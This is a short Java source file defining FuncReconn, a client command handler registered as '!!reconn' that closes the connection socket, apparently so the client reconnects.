package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;

/**
 * 重连
 */
public class FuncReconn implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!reconn";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 0;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        try {
            HandleConn.closeSocket();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
